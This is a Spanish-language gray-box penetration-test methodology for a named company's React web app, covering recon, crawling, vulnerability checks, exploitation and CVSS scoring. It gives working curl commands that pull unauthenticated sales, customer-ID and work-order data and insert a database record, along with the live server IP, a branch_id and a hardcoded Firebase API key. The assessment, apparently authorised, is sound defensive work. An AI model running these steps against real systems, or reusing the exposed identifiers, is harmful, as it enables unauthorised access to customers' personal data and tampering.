# PROCESO.md
## Proceso de Análisis — 5 Fases de Ejecución

**Proyecto:** Análisis de Vulnerabilidades — Diesel Soft SRL  
**Metodología:** Caja Gris (Gray Box) · OWASP Testing Guide v4.2  
**Sistema:** Kali Linux · `wo.dieselsoft.co`

---

## Diagrama General

```
wo.dieselsoft.co
       │
       ▼
┌─────────────────┐
│  FASE 1         │  Reconocimiento Pasivo
│  who.is         │  Wappalyzer · curl SSL
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  FASE 2         │  Enumeración Activa
│  Katana         │  Bundle JS · Gobuster
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  FASE 3         │  Identificación de Vulnerabilidades
│  curl · openssl │  ZAP · Headers · TLS · Firebase
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  FASE 4         │  Validación y Explotación
│  curl · Python  │  Postman · Navegador
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  FASE 5         │  Documentación y Clasificación
│  CVSS v3.1      │  OWASP mapping · Evidencias
└─────────────────┘
         │
         ▼
    8 Vulnerabilidades identificadas
    5 Explotadas con evidencia real
```

---

## Fase 1 — Reconocimiento Pasivo

**Objetivo:** Recopilar información sobre la infraestructura sin interactuar directamente con la aplicación.

---

### 1.1 Resolución DNS — Identificar IP real del servidor

**Problema:** Una consulta DNS estándar devuelve IPs de Cloudflare (proxy inverso), no la IP real del servidor.

**Solución:** Usar el servicio RDAP de `who.is` que consulta registros de dominio directamente.

**Herramienta:** Navegador web → `https://who.is`  
**Acción:** Ingresar `dieselsoft.co` en el campo de búsqueda

**Resultado:**
```
IP real:    159.89.139.254
Proveedor:  DigitalOcean LLC
País:       United States
```

> **Nota:** La IP es pública y accesible sin herramientas especializadas. Cloudflare no ocultó la IP del servidor raíz.

---

### 1.2 Identificación de Tecnologías — Stack del frontend

**Herramienta:** Wappalyzer (extensión de navegador)  
**URL:** `https://wo.dieselsoft.co/login`

> **Nota:** `whatweb` fue bloqueado por Cloudflare con error 530, por lo que se usó Wappalyzer desde el navegador.

```bash
# whatweb fue bloqueado:
whatweb https://wo.dieselsoft.co
# Error 530 — Cloudflare bloqueó la solicitud
```

**Resultado Wappalyzer:**

| Tecnología | Categoría | Relevancia para el análisis |
|---|---|---|
| React | Framework JS | SPA → lógica embebida en bundle JS |
| React Router | Enrutamiento | Rutas de navegación en el frontend |
| Tailwind CSS | Estilos | Irrelevante para seguridad |
| nginx | Servidor web | Configuración de headers y TLS aquí |

---

### 1.3 Verificación SSL/TLS — Certificado del servidor

**Herramienta:** `curl` | **Sistema:** Kali Linux

```bash
curl -v https://wo.dieselsoft.co/ 2>&1 | grep -A 10 "* Server certificate"
```

**Resultado:**
```
* Server certificate:
*  subject: CN=wo.dieselsoft.co
*  issuer: Google Trust Services
*  SSL certificate verify ok.
```

| Campo | Valor |
|---|---|
| Emisor | Google Trust Services |
| Algoritmo | EC (Curva Elíptica) |
| Estado | Válido y vigente |

---

## Fase 2 — Enumeración Activa

**Objetivo:** Explorar la aplicación para descubrir rutas, backends y la superficie de ataque real.

---

### 2.1 Crawling con Katana — Descubrimiento de URLs

**Por qué Katana y no otras herramientas:** La aplicación es una SPA de React. Las rutas no están en el HTML sino en el bundle JavaScript. Katana ejecuta el JS y extrae URLs dinámicas.

**Herramienta:** Katana | **Sistema:** Kali Linux

```bash
katana -u https://wo.dieselsoft.co -d 3 -jc -timeout 10 -rate-limit 100
```

**Parámetros:**
```
-u  https://wo.dieselsoft.co   URL objetivo
-d  3                          Profundidad 3 niveles
-jc                            JavaScript crawling (ejecuta JS)
-timeout  10                   10 segundos máximo por solicitud
-rate-limit  100               Máximo 100 solicitudes/segundo
```

**Resultado — URLs más relevantes encontradas:**
```
https://wo.dieselsoft.co/assets/index-BMwkIzXx.js     ← Bundle JS principal
https://wo.dieselsoft.co/assets/index.es-CMPtnVZd.js
https://wo.dieselsoft.co/inv-api/openapi.json          ← HALLAZGO CRÍTICO
https://wo.dieselsoft.co/inv-api/docs                  ← Swagger UI
https://wo.dieselsoft.co/inv-api/redoc                 ← ReDoc UI
https://wo.dieselsoft.co/inv-api/health
```

> **Hallazgo crítico:** `/inv-api/openapi.json` está accesible sin autenticación. Contiene la especificación técnica completa de la API: 87 endpoints, métodos HTTP, parámetros y esquemas de autenticación.

---

### 2.2 Inspección del Bundle JavaScript — Identificación de backends

**Herramienta:** Navegador web (DevTools)  
**Archivo inspeccionado:** `https://wo.dieselsoft.co/assets/index-BMwkIzXx.js`

**Proceso:**
1. Abrir el archivo en el navegador
2. Usar `Ctrl+F` para buscar `"/api"`, `"apiKey"`, `"firebase"`

**Constantes encontradas en el código minificado:**

```javascript
const NY = "/api"                        // Backend principal
const CY = "/auth-api/users"             // Backend de autenticación
const TY = "/inv-api"                    // Backend de inventario ← VULNERABLE
const OY = 3e4                           // Timeout: 30,000 ms
const Jy = "ViJKnOKl4KbDfgeR9cdb"       // branch_id hardcodeado
const PY = "work_order"                  // Nombre del módulo

// Credenciales Firebase hardcodeadas (V3):
apiKey:            "AIzaSyCG_Y4Heup1vPRYOYfXeN8OL7lF-T91wB4"
authDomain:        "w-o-ds.firebaseapp.com"
projectId:         "w-o-ds"
storageBucket:     "w-o-ds.firebasestorage.app"
messagingSenderId: "317020473872"
appId:             "1:317020473872:web:72d4a039736fe3350e5895"
```

> **Sobre el minificado:** El compilador de React reemplaza nombres como `INVENTORY_API_URL` por abreviaciones de 2 letras (`TY`) para reducir el tamaño del archivo. Se confirma que es un backend viendo cómo se usa:
> ```javascript
> fetch(TY + "/api/product/products")  // TY = "/inv-api"
> ```

**Los 3 backends identificados:**

| Constante | Ruta | Estado de autenticación |
|---|---|---|
| `NY` | `/api` | Con autenticación ✓ |
| `CY` | `/auth-api/users` | Con autenticación ✓ |
| `TY` | `/inv-api` | **Sin autenticación ✗** |

---

### 2.3 Fuzzing con Gobuster — Rutas activas en /inv-api

**Herramienta:** Gobuster | **Sistema:** Kali Linux

```bash
gobuster dir \
  -u https://wo.dieselsoft.co/inv-api \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 \
  --exclude-length 1223,1070
```

**Resultado:**
```
/docs     (Status: 200) [Size: 1305]   ← Swagger UI expuesto
/health   (Status: 200) [Size: 109]    ← Health check
/redoc    (Status: 200) [Size: 1265]   ← ReDoc UI expuesto
```

---

### 2.4 Análisis del openapi.json — Mapa completo de la API

**URL:** `https://wo.dieselsoft.co/inv-api/openapi.json`  
**Acceso:** Sin autenticación desde el navegador

**Proceso:**
1. Acceder a `https://wo.dieselsoft.co/inv-api/docs` desde el navegador
2. Ver código fuente (`Ctrl+U`)
3. En la línea 16 encontrar la ruta del archivo de especificación: `/openapi.json`
4. Acceder directamente: `https://wo.dieselsoft.co/inv-api/openapi.json`

**Resultado:** 87 endpoints documentados sin campo `security`, confirmando que ninguno requiere autenticación.

---

## Fase 3 — Identificación de Vulnerabilidades

**Objetivo:** Verificar la existencia de cada vulnerabilidad con evidencia técnica.

---

### 3.1 Verificación de Autenticación (V1)

```bash
# Intento de acceso al catálogo de productos sin token
curl -s "https://wo.dieselsoft.co/inv-api/api/product/products" \
  -H "User-Agent: Mozilla/5.0"

# Respuesta: {"detail":[{"type":"missing","loc":["query","branch_id"],"msg":"Field required"}]}
# → El servidor pide branch_id pero NO un token de autenticación ← VULNERABLE

# Obtener branch_id desde endpoint de pasillos
curl -s "https://wo.dieselsoft.co/inv-api/api/aisle/" \
  -H "User-Agent: Mozilla/5.0"
# Respuesta: {"name":"P1","branch_id":"ViJKnOKl4KbDfgeR9cdb",...}

# Acceso al catálogo con branch_id — sin token
curl -s "https://wo.dieselsoft.co/inv-api/api/product/products?branch_id=ViJKnOKl4KbDfgeR9cdb" \
  -H "User-Agent: Mozilla/5.0"
# Respuesta: 554 productos con precios, cantidades y ubicaciones ← CONFIRMADO
```

---

### 3.2 Verificación de URLs Permanentes (V2)

```bash
# Acceder al endpoint de órdenes de trabajo
curl -s "https://wo.dieselsoft.co/inv-api/api/work-orders/" \
  -H "User-Agent: Mozilla/5.0" | python3 -m json.tool | grep -A2 "urlFile"

# Resultado: campo urlFile con URLs de Firebase que incluyen parámetro:
# Expires=16447032000  ← equivale al año 2491
```

---

### 3.3 Verificación de Rate Limiting (V5)

```bash
# Enviar 20 solicitudes consecutivas
for i in {1..20}; do
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" \
    "https://wo.dieselsoft.co/inv-api/api/category/" \
    -H "User-Agent: Mozilla/5.0"
done

# Resultado esperado si hay rate limiting: HTTP 429 en alguna solicitud
# Resultado real: Request 1: 200 ... Request 20: 200 ← SIN LÍMITE
```

---

### 3.4 Verificación de Protocolos TLS (V6)

```bash
# Verificar TLS 1.0 (deprecado desde 2020 — RFC 8996)
openssl s_client -connect wo.dieselsoft.co:443 -tls1 < /dev/null 2>&1 | grep Protocol
# Resultado: Protocol: TLSv1 ← ACEPTADO (vulnerable)

# Verificar TLS 1.1 (deprecado desde 2020 — RFC 8996)
openssl s_client -connect wo.dieselsoft.co:443 -tls1_1 < /dev/null 2>&1 | grep Protocol
# Resultado: Protocol: TLSv1.1 ← ACEPTADO (vulnerable)
```

---

### 3.5 Verificación de Headers de Seguridad (V7)

```bash
curl -s -I "https://wo.dieselsoft.co/" -H "User-Agent: Mozilla/5.0"

# Headers presentes: Content-Type, Server, Date, CF-Cache-Status...
# Headers AUSENTES (ninguno de los 5 de seguridad encontrado):
# ✗ Strict-Transport-Security
# ✗ X-Frame-Options
# ✗ X-Content-Type-Options
# ✗ Content-Security-Policy
# ✗ Permissions-Policy
```

---

### 3.6 Verificación de Endpoint Debug (V8)

```bash
# Verificar si el endpoint de debug responde sin autenticación
curl -s -I "https://wo.dieselsoft.co/inv-api/api/sale/debug-register" \
  -H "User-Agent: Mozilla/5.0" \
  -X POST

# Resultado: HTTP/2 200 ← activo en producción sin autenticación
```

---

## Fase 4 — Validación y Explotación

**Objetivo:** Confirmar las vulnerabilidades mediante explotación real con autorización de Diesel Soft SRL.

> ⚠️ **Todas las explotaciones se realizaron con autorización explícita. No se ejecutó exfiltración masiva. Solo se verificó accesibilidad mediante muestreo.**

---

### Explotación 1 — Catálogo de Productos (V1)

```bash
# Paso 1: Obtener branch_id
curl -s "https://wo.dieselsoft.co/inv-api/api/aisle/" \
  -H "User-Agent: Mozilla/5.0"
# → branch_id: "ViJKnOKl4KbDfgeR9cdb"

# Paso 2: Acceder al catálogo completo desde el navegador
# URL: https://wo.dieselsoft.co/inv-api/api/product/products?branch_id=ViJKnOKl4KbDfgeR9cdb
```

**Resultado:** 554 productos con nombre, precio, cantidad, stock, código, ubicación física (pasillo/columna/fila) e imágenes. Sin token. Sin autenticación.

---

### Explotación 2 — Datos de Ventas (V1)

```bash
# Desde navegador — sin token:
# https://wo.dieselsoft.co/inv-api/api/sale/
```

**Resultado:** 167 registros de ventas con nombres completos, cédulas de identidad y teléfonos de clientes y empleados.

---

### Explotación 3 — Órdenes de Trabajo (V1 + V2)

```bash
# Desde navegador — sin token:
# https://wo.dieselsoft.co/inv-api/api/work-orders/
```

**Resultado:** 50 órdenes de trabajo con nombres de clientes, matrículas, números de chasis y URLs de PDFs con expiración en el año 2491.

---

### Explotación 4 — Inserción en Base de Datos (V1)

```bash
curl -s -X POST "https://wo.dieselsoft.co/inv-api/api/category/register" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0" \
  -d '{"name":"PRUEBA SEGURIDAD"}'

# Resultado:
# {"name":"PRUEBA SEGURIDAD","state_control":true,"category_id":"h0uXP3yUcsIMdPHWq15F"}

# Confirmación de persistencia:
# https://wo.dieselsoft.co/inv-api/api/category/
# → "PRUEBA SEGURIDAD" aparece en la lista del sistema
```

---

### Explotación 5 — Firebase Storage (V3 + V4)

```bash
# Paso 1: Obtener URL de archivo desde órdenes de trabajo
# https://wo.dieselsoft.co/inv-api/api/work-orders/
# → Campo urlFile contiene URL de Firebase Storage

# Paso 2: Acceder directamente desde el navegador
# URL Firebase: https://firebasestorage.googleapis.com/v0/b/w-o-ds.../o/...
# → Archivo descargado sin credenciales ← CONFIRMADO
```

---

## Fase 5 — Documentación y Clasificación

**Objetivo:** Registrar evidencia, clasificar por CVSS y mapear a OWASP Top 10.

---

### Clasificación CVSS v3.1

| ID | Vector CVSS | Puntuación | Severidad |
|---|---|---|---|
| V1 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | **9.9** | 🔴 CRÍTICA |
| V2 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | **8.1** | 🟠 ALTA |
| V3 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | **7.5** | 🟠 ALTA |
| V4 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | **7.5** | 🟠 ALTA |
| V5 | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H | **7.5** | 🟠 ALTA |
| V6 | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N | **6.5** | 🟡 MEDIA |
| V7 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | **5.3** | 🟡 MEDIA |
| V8 | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | **5.3** | 🟡 MEDIA |

---

### Mapeo OWASP Top 10 (2021)

| Vulnerabilidad | Categoría OWASP |
|---|---|
| V1 — Sin autenticación | A01 Broken Access Control + A07 Identification Failures |
| V2 — URLs permanentes | A01 Broken Access Control + A02 Cryptographic Failures |
| V3 — Credenciales Firebase | A02 Cryptographic Failures |
| V4 — Storage público | A02 Cryptographic Failures |
| V5 — Sin rate limiting | A04 Insecure Design |
| V6 — TLS deprecado | A02 Cryptographic Failures |
| V7 — Headers faltantes | A05 Security Misconfiguration |
| V8 — Debug en producción | A05 Security Misconfiguration + A09 Logging Failures |

---

*Documento parte del repositorio: Análisis de Vulnerabilidades — Diesel Soft SRL · 2026*
